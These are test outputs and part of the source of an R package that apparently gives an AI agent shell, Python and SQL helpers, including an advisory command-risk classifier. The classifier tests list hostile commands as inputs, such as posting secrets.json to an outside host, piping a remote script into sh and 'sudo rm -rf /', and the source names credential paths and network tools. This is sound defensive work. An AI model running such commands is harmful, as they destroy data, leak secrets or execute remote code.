````

### `final/p04_sh.out`

````text
locale: C | shell: bash 

--- argv form ---
a b
café
[PASS] argv form keeps 'a b' as one argument
[PASS] UTF-8 in C locale: stdout marked UTF-8 and correct bytes
[PASS] UTF-8-marked argument reaches the child as UTF-8 bytes

--- string form: simple command runs without a shell ---
git version 2.54.0 (Apple Git-157)
[PASS] simple string -> direct exec
[PASS] quotes handled by the splitter

--- string form with shell syntax goes to the resolved shell ---
   2 x
   1 y
[PASS] pipeline via shell

--- stderr kept separate, non-zero exit reported, no throw ---
out
[stderr]
oops
[exit 3]
[PASS] status 3
[PASS] stderr separate
[PASS] check = TRUE raises classed error

--- stdin input from an R character vector and a data frame ---
   1 a
   2 b
5 ['cyl', 'disp', 'mpg']
[PASS] data frame as CSV on stdin

--- timeout kills the whole process tree ---
[timed out after 1.06s; process tree killed]
[PASS] timed out in 1.1s and no sleep left

--- truncation to a token budget with a spill file ---
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
[... 19,974 lines omitted (20,000 total, 106.3KB); all: gptr$out(11)$stdout]
19991
19992
19993
19994
19995
19996
19997
19998
19999
20000
[PASS] full output kept in spill file
[PASS] printed view within budget (134 est. / 91 o200k tokens for a 120-token budget + notice)

--- ANSI colour and carriage-return progress are cleaned ---
red
100%
[PASS] clean

--- scripts by extension ---
sh script args: x y z
py script ['x', 'y z']
R script x y z 
js script [ 'x', 'y z' ]
shebang ok
missing .cmd: script not found: /var/folders/83/pgprwt8s3w5_cgrt3rz3x21w0000gn/T//RtmptboUHg/g5w-104991bac5635/x.cmd 

--- RNG untouched ---
[PASS] helper does not consume .Random.seed

--- no R connections left open ---
[PASS] showConnections() empty
````

### `final/p04d_killtree2.out`

````text
/bin/bash -c 'sleep 30 & wait'     environ readable (0 vars)                kill_tree killed 0 pid(s); child alive after: TRUE
[1] TRUE
/bin/sleep 30                      environ readable (0 vars)                kill_tree killed 0 pid(s); child alive after: TRUE
[1] TRUE
python3 (homebrew) sleep           environ readable (96 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
Rscript -e Sys.sleep(30)           environ readable (95 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
python3 spawning /bin/sleep        environ readable (96 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
left over sleeps: 64314 /bin/sleep 31, 
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

child pid 64321 pgid 64321 (leader: TRUE )
after pskill(-pid): alive = TRUE  leftovers: 64321,64322,64323, 
````

### `final/p04e_kill.out`

````text
[1] TRUE
p$kill():                        alive = FALSE  leftovers:  
named integer(0)
[1] TRUE
p$kill_tree(); p$kill():         alive = FALSE  leftovers:  
tools::pskill(-pid) returned FALSE   alive = TRUE  leftovers: 64360,64361,64362, 
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

/bin/kill -KILL -- -pgid:        alive = FALSE  leftovers:  
Python 
 64380 
[1] TRUE
python+sleep: kill_tree + kill:   alive = FALSE  leftovers:  
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

named integer(0)
python+sleep: kill -pgid + tree: alive = FALSE  leftovers:  
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

named integer(0)
setsid grandchild: kill -pgid + tree: leftovers: 64400, 
````

### `final/p05_bg_interrupt.out`

````text
--- a long-running job with progress output ---
<job1> running, 0s, pid 64531, 0B unread; cmd: python3 -u -c import time for i in range(1, 9): print(f'epoc
epoch 1/8 loss=1.000
epoch 2/8 loss=0.500
epoch 3/8 loss=0.333
[job1 running, 1s]
[job1 running; no new output]
[PASS] second read returns only new output (none yet or a few lines)
epoch 4/8 loss=0.250
epoch 5/8 loss=0.200
epoch 6/8 loss=0.167
epoch 7/8 loss=0.143
epoch 8/8 loss=0.125
DONE acc=0.93
[job1 exited 0, 3s]
[PASS] wait(until =) returned once DONE appeared
    id   status                                      cmd
1 job1 exited 0 python3 -u -c import time for i in range

--- a server-like job: wait until ready, talk to it over stdin, kill ---
ready
[echo_srv running, 0s]
echo: olleh
echo: rtpg
[echo_srv running, 0s]
[PASS] 200 KB written through the non-blocking write loop
[PASS] killed job is not running
        id    status                                      cmd
1     job1  exited 0 python3 -u -c import time for i in range
2 echo_srv exited -9 python3 -u -c import sys print('ready', 

--- Ctrl-C during a foreground gptr$sh(): the whole tree must die ---
before SIGINT, sleeps alive: 64762,64763,64764, 
[1] TRUE
child R saw: INTERRUPTED 
[PASS] no sleep 37/38 left after Ctrl-C
````

### `final/p06_py.out`

````text
python configured by RETICULATE_PYTHON = /opt/homebrew/bin/python3 
initialised before first call: FALSE 

--- statements, prints and a persistent object ---
hello from python
42
[PASS] object persisted across calls

--- data frame in, bounded repr out, R value back ---
month        1        2        3        4        5        6        7        8        9        10       11       12
region                                                                                                            
east    10868.0   9881.0   9350.0   8928.0  10379.0  10816.0  11247.0   7706.0  11555.0  11037.0  11143.0  10181.0
north   11357.0   9556.0  10673.0   9532.0  10789.0  11210.0   9377.0  11951.0  10999.0  10111.0   8227.0  12366.0
south   12159.0  13715.0   7748.0  11269.0  12785.0  10131.0   8607.0   9404.0  10432.0   9433.0  10100.0   7677.0
west    10249.0  10939.0  14191.0  10025.0   9541.0  13227.0  12497.0   8948.0   9696.0  11804.0   8440.0  10385.0
[PASS] pandas result converted back to an R data.frame
repr of the 5000-row frame printed as 14 lines

--- Python error: compact, no R error, session continues ---
[python error]
line 2: y = undefined_name + x
NameError: name 'undefined_name' is not defined
[PASS] error captured as text
[python error]
SyntaxError: invalid syntax (line 1: def f(:)
[PASS] syntax error is one line
[PASS] statements before the error ran

--- stderr and warnings are captured ---
[stderr]
to stderr
<gptr>:3: UserWarning: careful

--- reticulate's `r` object: Python can read R objects by name ---
502641.18
R check: 502641.2 

--- copy-safety: does passing a big vector leave a sticky reference? ---
kept in Python, then v1[1] = 0 in R -> copied: TRUE 
dropped by Python, then v2[1] = 0 in R -> copied: TRUE 
read via r.v3 (not passed), then v3[1] = 0 -> copied: FALSE 

--- knitr's python engine shares the same __main__ ---
## 42
 
[PASS] knitr python chunk sees objects created by gptr$py
````

### `final/p06b_sticky.out`

````text
nothing                                              next in-place edit copies: FALSE
list(v) inside a closure                             next in-place edit copies: TRUE
reticulate::r_to_py(v), dropped                      next in-place edit copies: TRUE
r_to_py(v) assigned in __main__ then deleted         next in-place edit copies: FALSE
python reads r.gv (by name)                          next in-place edit copies: TRUE
````

### `final/p07_sql_knit.out`

````text
--- connection found in scope (exactly one DBIConnection binding) ---
found: shop 
# 5,417 rows x 3 cols
 id region amount
  5   west 284.56
 10   west 264.04
 14   west 384.03
 16   west 157.99
 17   west 121.69
 18  north 714.01
 19  south 171.62
 20  north 388.61
 21   west 242.84
 22  north 259.60
# ... 5,407 more rows (all fetched rows are in the value)
[PASS] all rows fetched into the value, only 10 printed
# 4 rows x 3 cols
 region    n   avg
   west 5099 89.40
  south 5035 91.11
  north 4978 93.03
   east 4888 87.94
# 4 rows affected

--- two connections in scope: explicit con = required ---
several connections in scope (other, shop); pass con = 
[PASS] ambiguity is an error naming the candidates

--- SQL over in-memory data frames through duckdb (no copy into a database) ---
duckdb over a 2e6-row data frame: 0.20s
# 5 rows x 3 cols
 g      n    mean_v
 a 400419 0.5000067
 b 399611 0.5006924
 c 400860 0.4997255
 d 399758 0.5005728
 e 399352 0.5002491
[PASS] column vector not copied by registration
next in-place edit of big$v copies: TRUE 

--- knitr engines: native bridges for bash/python/sql, knitr for the rest ---
from bash: 42
from perl: 42
from ruby: 42
from node: 42
unknown knitr engine: nosuch 
knitr engines available: 52 
````

### `final/p08_classify.out`

````text
ok   got 0 want 0 | gptr$sh("git status --short")                                  | [read: git status]
ok   got 0 want 0 | gptr$sh(c("git", "diff", "--stat"))                            | [read: git diff]
ok   got 0 want 0 | gptr$sh("rg -n TODO R/ | head -20")                            | [read: rg; read: head]
ok   got 0 want 0 | gptr$sh("ls -la; wc -l data.csv")                              | [read: ls; read: wc]
ok   got 0 want 0 | gptr$sh("git -C sub/dir -c core.pager=cat status")             | [read: git status]
ok   got 2 want 2 | gptr$sh("git commit -am wip")                                  | [vcs_write: git commit]
ok   got 3 want 3 | gptr$sh("git push origin main")                                | [network_send: git push]
ok   got 3 want 3 | gptr$sh("git reset --hard HEAD~1")                             | [vcs_destructive: git reset]
ok   got 2 want 2 | gptr$sh("curl -sSL https://example.org/x.csv -o data/x.csv")   | [network: curl (download); file_write: curl -> data/x.csv]
ok   got 3 want 3 | gptr$sh("curl -X POST -d @secrets.json https://example.org")   | [network_send: curl (sends data)]
ok   got 3 want 3 | gptr$sh("curl -fsSL https://get.example.sh | sh")              | [exec: sh runs ; remote_exec: pipe into sh]
ok   got 2 want 2 | gptr$sh("sort data.csv > sorted.csv")                          | [file_write: redirect to sorted.csv]
ok   got 3 want 3 | gptr$sh("echo x >> ~/.bashrc")                                 | [file_write: redirect to ~/.bashrc]
ok   got 3 want 3 | gptr$sh("rm -r build")                                         | [file_delete: rm build]
ok   got 4 want 4 | gptr$sh("rm -rf ~")                                            | [file_delete: rm ~]
ok   got 4 want 4 | gptr$sh("sudo rm -rf /")                                       | [file_delete: rm /]
ok   got 3 want 3 | gptr$sh("make")                                                | [build: make ]
ok   got 0 want 0 | gptr$sh("make -n")                                             | [read: make -n]
ok   got 3 want 3 | gptr$sh("quarto render report.qmd")                            | [build: quarto render]
ok   got 0 want 0 | gptr$sh("python3 --version")                                   | [read: python3 --version]
ok   got 3 want 3 | gptr$sh("python3 -c 'import os; os.remove(1)'")                | [dynamic: python3 inline code]
ok   got 3 want 3 | gptr$sh("pip install pandas")                                  | [package: pip install]
ok   got 2 want 2 | gptr$sh("env")                                                 | [secrets: env (prints the environment)]
ok   got 3 want 3 | gptr$sh(paste("rm", f))                                        | [computed_command: command built at run time]
ok   got 3 want 3 | gptr$sh("echo $(rm -rf build)")                                | [file_delete: rm build]
ok   got 3 want 3 | gptr$script("build.sh")                                        | [file_delete: rm build]
ok   got 3 want 3 | gptr$script("train.py")                                        | [exec: script]
ok   got 3 want 3 | j = gptr$bg("python3 -m http.server 8000")                     | [exec: python3 runs http.server]
ok   got 1 want 1 | gptr$py("t = df.groupby('g').v.mean()\nt", df = d)             | [python_state: runs Python in the persistent session]
ok   got 2 want 2 | gptr$py("df.to_csv('out.csv')")                                | [file_write: file_write]
ok   got 3 want 3 | gptr$py("import subprocess; subprocess.run(['ls'])")           | [process: process]
ok   got 3 want 3 | gptr$py("import requests; requests.get(u)")                    | [network: network]
ok   got 0 want 0 | gptr$sql("SELECT region, COUNT(*) FROM orders GROUP BY region" | [read: SELECT statement]
ok   got 0 want 0 | x = gptr$sql("WITH t AS (SELECT * FROM o) SELECT * FROM t", co | [read: WITH statement]
ok   got 2 want 2 | gptr$sql("UPDATE orders SET amount = 0 WHERE id = 1")          | [db_write: UPDATE statement]
ok   got 3 want 3 | gptr$sql("DROP TABLE orders")                                  | [db_write: DROP statement]
ok   got 3 want 3 | gptr$sql("SELECT 1; DROP TABLE orders")                        | [db_write: DROP statement]
ok   got 3 want 3 | gptr$sql("COPY orders TO '/tmp/o.parquet'")                    | [db_write: COPY statement]
ok   got 2 want 2 | gptr$sql("SELECT * FROM read_csv('https://x.org/a.csv')")      | [network: reads a URL]
ok   got 0 want 0 | gptr$knit("bash", "wc -l *.csv")                               | [read: wc]
ok   got 3 want 3 | gptr$knit("perl", "print 1")                                   | [exec: knitr engine perl]
ok   got 0 want 0 | system2("git", c("log", "-1"))                                 | [read: system2(): git log]
ok   got 3 want 3 | system("rm -rf build")                                         | [file_delete: system(): rm build]
ok   got 0 want 0 | processx::run("git", "status")                                 | [read: run(): git status]
ok   got 0 want 0 | gptr::gptr$sh("git log -3 --oneline")                          | [read: git log]
ok   got 0 want 0 | n = length(gptr$sh("git ls-files")$stdout); if (n > 100) gptr$ | [read: git ls-files; read: git status]

46 / 46 expectations met
classification cost: 1.84 ms per call
````

### `final/p09_history.out`

````text
=== .R history block ===
# >>> gptr:deb83d model=anthropic/claude-sonnet-5-5 risk=1
st = gptr$sh("git -C bench/repo status --porcelain")$stdout
table(substr(st, 1, 2))
tab = gptr$py("sales.groupby('region').revenue.sum().round(0)", sales = sales)
top = gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region ORDER BY n DESC", orders = orders)
#> sh git -C bench/repo status --porcelain: exit 0, 6 lines
#> py: Series 2
#> sql: 3 rows x 2 cols
# <<< gptr:deb83d

=== .Rmd: single literal helper calls become native chunks ===
gptr$sh("quarto render report.qmd")                                            -> ```{bash} | quarto render report.qmd | ```
gptr$py("import pandas as pd\nsales = pd.read_csv('sales.csv')")               -> ```{python} | import pandas as pd
sales = pd.read_csv('sales.csv') | ```
gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region", con = shop)  -> ```{sql, connection=shop} | SELECT region, COUNT(*) n FROM orders GROUP BY region | ```
gptr$knit("perl", "print 6 * 7")                                               -> ```{perl} | print 6 * 7 | ```
x = gptr$sh("make")                                                            -> stays in the R chunk gptr-<id>
````

### `final/p10_tokens.out`

````text
 [1] TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE
[16] TRUE
        task variant calls call_tok result_tok total result_bytes bytes_per_tok
      T1_git       A     1        9       4408  4417        16732          3.80
      T1_git      A2     1       13         76    89          269          3.54
      T1_git       B     1       15       1296  1311         4862          3.75
      T1_git       C     1       62        872   934         3157          3.62
   T2_script       A     1        7       8098  8105        25520          3.15
   T2_script       B     1       12       1129  1141         3454          3.06
   T2_script       C     1       34         66   100          196          2.97
       T3_rg       A     1       13      12377 12390        51264          4.14
       T3_rg      A2     1       27        105   132          433          4.12
       T3_rg       B     1       19       1177  1196         5005          4.25
       T3_rg       C     1       61        135   196         1048          7.76
   T4_python       A     1       51        248   299          526          2.12
   T4_python       B     1       45        336   381          689          2.05
   T4_python       C     1       41         10    51           15          1.50
      T5_sql       A     3       86       6390  6476        15100          2.36
      T5_sql       B     3       67        316   383          685          2.17
      T5_sql       C     1       59        116   175          222          1.91
 T6_download       A     1       43        131   174          261          1.99
 T6_download       B     1       49        131   180          261          1.99
 T6_download       C     1       43        126   169          291          2.31
     T7_make       A     1        5       7263  7268        19501          2.68
     T7_make      A2     1       13         87   100          282          3.24
     T7_make       B     1       11       1532  1543         4128          2.69
     T7_make       C     1       29         84   113          263          3.13
     T8_long       A     1        8       6003  6011        11386          1.90
     T8_long      A2     3       52        152   204          296          1.95
     T8_long       B     1       14       1443  1457         2780          1.93
     T8_long       C     1       36        193   229          393          2.04

== totals over the 8 tasks (A = every task's plain bash variant) ==
A 45140 | B 7592 | C 1967 tokens ; round trips A 10, B 10, C 8

== calibration: chars/4 versus o200k_base on the tool results ==
A: bytes 140290, tokens 44918, bytes/token 3.12, chars/4 estimate error -22%
B: bytes 21864, tokens 7360, bytes/token 2.97, chars/4 estimate error -26%
C: bytes 5585, tokens 1602, bytes/token 3.49, chars/4 estimate error -13%
    id   status             cmd
1 job1 exited 0 python3 long.py
````

### `final/p11_calibrate.out`

````text
fitted tokens per character class:
   alpha    digit    space    punct  newline nonascii 
   0.137    0.805    0.092    0.663    1.718    0.333 
fit half       n=125 tokens= 49509 | chars/4 median  -6.5% p95|err| 51.7% | chars/3 median +24.7% | fitted median  +1.9% p95|err| 27.8% total  -0.2%
test half      n=124 tokens= 49615 | chars/4 median  -7.0% p95|err| 52.1% | chars/3 median +24.1% | fitted median  -0.0% p95|err| 19.2% total  -0.8%
test: bench    n= 69 tokens= 27093 | chars/4 median -20.1% p95|err| 52.6% | chars/3 median  +6.6% | fitted median  -1.2% p95|err| 19.2% total  -0.3%
test: other    n= 55 tokens= 22522 | chars/4 median  -4.8% p95|err| 46.8% | chars/3 median +27.0% | fitted median  +0.3% p95|err| 14.8% total  -1.3%
non-ASCII probe: o200k 199, fitted 338, chars/4 250

coefficients for g5_helpers.R:
c(alpha = 0.137, digit = 0.8054, space = 0.0919, punct = 0.6632, 
newline = 1.718, nonascii = 0.3333)
````

### `final/p12_declarations.out`

````text
Pi bash tool schema (wire JSON):          110 tokens
Pi bash prompt snippet:                    15 tokens
gptr <polyglot> prompt section:           297 tokens
an extra opt-in 'shell' tool (01 schema):  110 tokens
````

### `final/p13_echo.out`

````text
model saw 17 lines; first: progress 1 | notice: [... 284 lines omitted (300 total, 3.7KB); all: gptr$out(1)$stdout] 
````

### `g5_classify.R`

````r
# g5_classify.R -- advisory risk classification for polyglot helper calls (G5).
# Levels follow report 18: 0 read-only, 1 local, 2 mutating, 3 dangerous, 4 critical.
# NOT a security boundary: it reads text, it cannot see what programs or scripts do.

flag = function(level, category, what) data.frame(level = as.integer(level), category = category,
                                                  what = what, stringsAsFactors = FALSE)
no_flags = function() flag(integer(), character(), character())

# ---------------------------------------------------------------- paths (simplified report-18 classes)
PROTECTED = c("(^|/)\\.git(/|$)", "(^|/)\\.gptr/settings[^/]*$", "(^|/)\\.Rprofile$", "(^|/)\\.Renviron$",
              "(^|/)\\.env([.][^/]*)?$", "(^|/)\\.ssh(/|$)", "(^|/)\\.codex(/|$)", "(^|/)\\.claude(/|$)",
              "(^|/)\\.aws(/|$)", "(^|/)\\.gnupg(/|$)", "(^|/)\\.netrc$", "(^|/)renv\\.lock$",
              "(^|/)\\.(bashrc|zshrc|profile|bash_profile)$")
path_class = function(p, root = getwd()) {
  if (!length(p) || is.na(p) || !nzchar(p)) return("unknown")
  if (p %in% c("/dev/null", "NUL", "nul")) return("null")
  if (grepl("^[$%]|[*?]", p)) return(if (grepl("^(/|~|\\$HOME)[*]?$|^/[*]$", p)) "critical" else "wildcard")
  x = path.expand(p)
  if (!grepl("^(/|[A-Za-z]:)", x)) x = file.path(root, x)
  x = norm_existing(x)
  r = norm_existing(root)
  home = normalizePath(path.expand("~"), winslash = "/", mustWork = FALSE)
  if (x %in% c("/", home, r, dirname(r)) || grepl("^[A-Za-z]:/?$", x) || grepl("^/[^/]+/?$", x)) return("critical")
  if (any(vapply(PROTECTED, grepl, NA, x = x, perl = TRUE))) return("protected")
  if (startsWith(x, paste0(r, "/"))) return("workspace")
  tmp = norm_existing(tempdir())
  if (startsWith(x, paste0(tmp, "/")) || startsWith(x, "/tmp/") || startsWith(x, "/private/tmp/")) return("temp")
  "outside"
}
# normalise via the deepest existing ancestor (macOS /var -> /private/var; report 18)
norm_existing = function(x) {
  parts = character(); y = x
  while (!file.exists(y) && dirname(y) != y) { parts = c(basename(y), parts); y = dirname(y) }
  b = normalizePath(y, winslash = "/", mustWork = FALSE)
  if (length(parts)) paste(c(b, parts), collapse = "/") else b
}
write_level = function(pc) switch(pc, null = 0L, temp = 1L, workspace = 2L, critical = 4L, 3L)

# ---------------------------------------------------------------- shell words and simple commands
# Tokenise a shell string into words and operators (quotes respected). Returns list(words, ops).
sh_tokens = function(cmd) {
  ch = strsplit(cmd, "", fixed = TRUE)[[1]]
  out = character(); cur = ""; has = FALSE; q = ""; i = 1L; n = length(ch)
  push = function() { if (has) { out <<- c(out, cur) }; cur <<- ""; has <<- FALSE }
  while (i <= n) {
    c1 = ch[i]; c2 = if (i < n) ch[i + 1L] else ""
    if (q == "'") { if (c1 == "'") q = "" else cur = paste0(cur, c1) }
    else if (q == "\"") { if (c1 == "\"") q = "" else cur = paste0(cur, c1) }
    else if (c1 %in% c("'", "\"")) { q = c1; has = TRUE }
    else if (c1 %in% c(" ", "\t")) push()
    else if (c1 %in% c("\n", ";")) { push(); out = c(out, "<;>") }
    else if (c1 == "&" && c2 == "&") { push(); out = c(out, "<;>"); i = i + 1L }
    else if (c1 == "|" && c2 == "|") { push(); out = c(out, "<;>"); i = i + 1L }
    else if (c1 == "|") { push(); out = c(out, "<|>") }
    else if (c1 == "&" && c2 != ">") { push(); out = c(out, "<;>") }
    else if (c1 %in% c(">", "<") || (c1 %in% c("1", "2", "&") && c2 == ">" && !has)) {
      push()
      op = c1; if (c1 != ">" && c1 != "<") { op = paste0(c1, ">"); i = i + 1L }
      if (i < n && ch[i + 1L] == ">") { op = paste0(op, ">"); i = i + 1L }
      if (i < n && ch[i + 1L] == "&") { op = paste0(op, "&"); i = i + 1L }
      out = c(out, paste0("<", op, ">"))
    } else { cur = paste0(cur, c1); has = TRUE }
    i = i + 1L
  }
  push()
  out
}
split_simple = function(tokens) {
  cmds = list(); cur = character(); piped = FALSE; pipe_from = character()
  for (t in c(tokens, "<;>")) {
    if (t %in% c("<;>", "<|>")) {
      if (length(cur)) cmds[[length(cmds) + 1L]] = list(words = cur, piped_in = piped, pipe_from = pipe_from)
      if (t == "<|>" && length(cur)) pipe_from = cur[1L]
      piped = t == "<|>"; cur = character()
    } else cur = c(cur, t)
  }
  cmds
}

WRAPPERS = c("time", "nice", "nohup", "command", "builtin", "noglob", "stdbuf", "exec")
READ_ONLY = c("ls", "dir", "pwd", "cat", "head", "tail", "wc", "echo", "printf", "which", "where", "whoami",
              "date", "uname", "hostname", "id", "file", "stat", "du", "df", "tree", "sort", "uniq", "cut",
              "tr", "grep", "egrep", "fgrep", "rg", "ag", "fd", "diff", "cmp", "comm", "jq", "yq", "xxd",
              "od", "md5", "md5sum", "shasum", "sha1sum", "sha256sum", "basename", "dirname", "realpath",
              "readlink", "true", "false", "test", "[", "seq", "nproc", "column", "nl", "paste", "fold",
              "strings", "less", "more", "type", "ps", "sleep", "cd", "pushd", "popd",
              "get-childitem", "get-content", "select-string", "get-location", "get-item", "measure-object")
INTERPRETERS = c("python", "python3", "py", "rscript", "r", "node", "deno", "bun", "ruby", "perl", "julia",
                 "bash", "sh", "zsh", "dash", "fish", "pwsh", "powershell", "cmd", "php", "lua", "osascript")
PKG_MANAGERS = c("pip", "pip3", "conda", "mamba", "npm", "pnpm", "yarn", "brew", "apt", "apt-get", "yum",
                 "dnf", "gem", "cargo", "go", "uv", "winget", "choco", "scoop", "port", "tlmgr", "pak")
BUILD = c("make", "cmake", "ninja", "gradle", "mvn", "quarto", "latexmk", "pdflatex", "xelatex", "pandoc",
          "docker", "podman", "kubectl", "terraform", "npx", "just", "tox", "pytest", "cargo")
CRITICAL_PROGS = c("shutdown", "reboot", "halt", "poweroff", "mkfs", "diskutil", "format", "fdisk", "diskpart")
GIT_READ = c("status", "diff", "log", "show", "blame", "rev-parse", "ls-files", "ls-tree", "describe",
             "shortlog", "grep", "reflog", "cat-file", "whatchanged", "for-each-ref", "count-objects", "version",
             "help")
GIT_NET_READ = c("fetch", "clone", "pull", "ls-remote", "submodule")
GIT_DANGER = c("push", "clean", "filter-branch", "gc", "prune", "update-ref")

classify_simple = function(w, root) {
  f = no_flags()
  add = function(level, cat, what) f <<- rbind(f, flag(level, cat, what))
  # strip leading assignments and wrappers
  repeat {
    if (!length(w)) return(f)
    if (grepl("^[A-Za-z_][A-Za-z0-9_]*=", w[1L])) { w = w[-1L]; next }
    p = tolower(sub("\\.exe$", "", basename(w[1L])))
    if (p %in% WRAPPERS) { w = w[-1L]; next }
    if (p == "timeout") { w = w[-(1:2)]; next }
    if (p == "env") { if (length(w) == 1L) { add(2, "secrets", "env (prints the environment)"); return(f) }; w = w[-1L]; next }
    if (p %in% c("sudo", "doas", "su")) { add(3, "elevated", p); w = w[-1L]; next }
    if (p == "xargs") { add(3, "dynamic", "xargs runs commands built from input"); w = w[-1L]; next }
    break
  }
  p = tolower(sub("\\.exe$", "", basename(w[1L])))
  a = w[-1L]
  has = function(rx) any(grepl(rx, a, perl = TRUE))
  first_arg = function() { x = a[!startsWith(a, "-")]; if (length(x)) x[1L] else "" }
  if (p %in% c("printenv", "set", "export")) add(2, "secrets", paste(p, "(environment values)"))
  else if (p == "echo" && has("\\$\\{?[A-Za-z_]*(KEY|TOKEN|SECRET|PASSWORD)")) add(2, "secrets", "echo of a secret-looking variable")
  else if (p == "find") {
    if (has("^-(delete|exec|execdir|ok|okdir)$")) add(3, "dynamic", "find with -delete/-exec") else add(0, "read", "find")
  } else if (p == "sed") {
    if (has("^-i|^--in-place")) add(2, "file_write", "sed -i") else add(0, "read", "sed")
  } else if (p %in% c("awk", "gawk")) {
    if (has("system\\(|print[^|]*>")) add(3, "dynamic", "awk with system()/redirect") else add(0, "read", p)
  } else if (p == "tee") {
    for (t in a[!startsWith(a, "-")]) add(write_level(path_class(t, root)), "file_write", paste("tee", t))
  } else if (p == "sort" && has("^-o")) add(2, "file_write", "sort -o")
  else if (p %in% READ_ONLY) add(0, "read", p)
  else if (p == "git") {
    ga = a                                          # skip global options: -C <dir>, -c <k=v>, --git-dir=...
    while (length(ga) && startsWith(ga[1L], "-")) ga = if (ga[1L] %in% c("-C", "-c")) ga[-(1:2)] else ga[-1L]
    sub = if (length(ga)) ga[1L] else ""
    a = ga
    if (sub %in% GIT_READ) add(0, "read", paste("git", sub))
    else if (sub == "branch" && !has("^-[dDmMcC]$|^--(delete|move|copy)")) add(0, "read", "git branch")
    else if (sub == "tag" && !has("^-[ad]$|^--delete")) add(0, "read", "git tag")
    else if (sub %in% c("remote", "config", "stash") && (!length(a[-1]) || has("^(-v|list|show|--get|--list|-l)$")))
      add(0, "read", paste("git", sub))
    else if (sub %in% GIT_NET_READ) add(2, "network", paste("git", sub))
    else if (sub %in% GIT_DANGER || (sub == "reset" && has("^--hard$")) ||
             (sub == "checkout" && has("^(--|\\.)$")) || (sub == "branch" && has("^-D$")))
      add(3, if (sub == "push") "network_send" else "vcs_destructive", paste("git", sub))
    else add(2, "vcs_write", paste("git", sub))
  } else if (p %in% c("curl", "wget", "http", "https", "invoke-webrequest", "iwr")) {
    if (has("^(-d|--data.*|-F|--form.*|-T|--upload-file|--post-data|--post-file|--json)$|^-X(POST|PUT|PATCH|DELETE)?$|^--request$"))
      add(3, "network_send", paste(p, "(sends data)"))
    else add(2, "network", paste(p, "(download)"))
    o = which(a %in% c("-o", "--output", "-O", "--output-document"))
    for (k in o) if (k < length(a)) add(write_level(path_class(a[k + 1L], root)), "file_write", paste(p, "->", a[k + 1L]))
  } else if (p %in% c("ssh", "scp", "rsync", "sftp", "ftp", "nc", "telnet")) add(3, "network_send", p)
  else if (p %in% c("rm", "rmdir", "unlink", "del", "erase", "rd", "remove-item")) {
    tg = a[!startsWith(a, "-")]
    lv = if (length(tg)) max(3L, vapply(tg, function(t) if (path_class(t, root) == "critical") 4L else 3L, 1L)) else 3L
    add(lv, "file_delete", paste(p, paste(tg, collapse = " ")))
  } else if (p %in% c("cp", "mv", "mkdir", "touch", "ln", "copy", "move", "copy-item", "move-item", "new-item")) {
    tg = a[!startsWith(a, "-")]
    tgt = if (length(tg)) tg[length(tg)] else ""
    add(max(if (p == "mkdir") 1L else 2L, write_level(path_class(tgt, root))), "file_write", paste(p, tgt))
  } else if (p %in% c("chmod", "chown", "chgrp", "icacls", "attrib")) add(if (has("^-R$")) 3 else 2, "permissions", p)
  else if (p %in% c("kill", "pkill", "killall", "taskkill", "stop-process")) add(3, "process_kill", p)
  else if (p %in% CRITICAL_PROGS || (p == "dd" && has("^of="))) add(4, "system", p)
  else if (p %in% c("crontab", "launchctl", "systemctl", "service", "schtasks", "reg", "setx")) add(3, "system", p)
  else if (p %in% PKG_MANAGERS && has("^(install|i|add|ci|update|upgrade|remove|uninstall|sync|get)$")) add(3, "package", paste(p, first_arg()))
  else if (p %in% INTERPRETERS) {
    if (has("^(--version|-V|--help)$") && length(a) == 1L) add(0, "read", paste(p, a))
    else if (has("^(-c|-e|-E|--eval|-Command|-EncodedCommand|/c|/k)$")) add(3, "dynamic", paste(p, "inline code"))
    else add(3, "exec", paste(p, "runs", first_arg()))
  } else if (p %in% BUILD) {
    if (has("^(--version|-v|--help|-n|--dry-run)$")) add(0, "read", paste(p, paste(a, collapse = " ")))
    else if (p == "quarto" && first_arg() == "publish") add(3, "network_send", "quarto publish")
    else add(3, "build", paste(p, first_arg()))
  } else add(3, "unknown_program", p)
  f
}

gptr_classify_cmd = function(cmd, root = getwd()) {
  if (length(cmd) > 1L) return(classify_simple(cmd, root))       # argv form: one program, no shell
  if (grepl("\\$\\(|`", cmd)) {
    inner = regmatches(cmd, gregexpr("\\$\\(([^()]*)\\)|`([^`]*)`", cmd))[[1]]
    inner = gsub("^\\$\\(|\\)$|^`|`$", "", inner)
    f = do.call(rbind, c(list(no_flags()), lapply(inner, gptr_classify_cmd, root = root)))
    cmd = gsub("\\$\\(([^()]*)\\)|`([^`]*)`", "SUBST", cmd)
  } else f = no_flags()
  tk = sh_tokens(cmd)
  # redirections: "<>>>" etc followed by a target word
  red = which(grepl("^<[0-9&]?>+&?>$", tk))
  for (k in red) if (k < length(tk) && !grepl("^[0-9]$", tk[k + 1L]))
    f = rbind(f, flag(write_level(path_class(tk[k + 1L], root)), "file_write", paste("redirect to", tk[k + 1L])))
  drop = unique(c(red, red + 1L, which(tk == "<<>")))
  if (length(drop)) tk = tk[-drop]
  for (sc in split_simple(tk)) {
    f = rbind(f, classify_simple(sc$words, root))
    p = tolower(basename(sc$words[1L]))
    if (sc$piped_in && p %in% INTERPRETERS)
      f = rbind(f, flag(3, if (tolower(basename(sc$pipe_from)) %in% c("curl", "wget")) "remote_exec" else "dynamic",
                        paste("pipe into", p)))
  }
  f
}

# ---------------------------------------------------------------- SQL
gptr_classify_sql = function(query) {
  q0 = gsub("--[^\n]*|/\\*.*?\\*/", " ", query, perl = TRUE)
  q = gsub("'([^']|'')*'", "''", q0, perl = TRUE)
  stm = trimws(strsplit(q, ";", fixed = TRUE)[[1]])
  stm = stm[nzchar(stm)]
  f = no_flags()
  for (s in stm) {
    k = toupper(regmatches(s, regexpr("^[A-Za-z]+", s)))
    S = toupper(s)
